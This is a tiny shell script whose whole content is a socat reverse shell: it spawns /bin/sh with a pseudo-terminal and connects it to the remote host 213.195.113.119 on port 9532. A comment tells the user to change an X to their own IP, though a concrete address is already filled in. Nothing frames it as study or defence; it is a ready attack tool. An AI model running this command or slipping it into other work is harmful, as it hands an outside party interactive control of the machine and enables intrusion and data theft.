#!/usr/bin/env sh
#Change the X for your IP 
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:213.195.113.119:9532
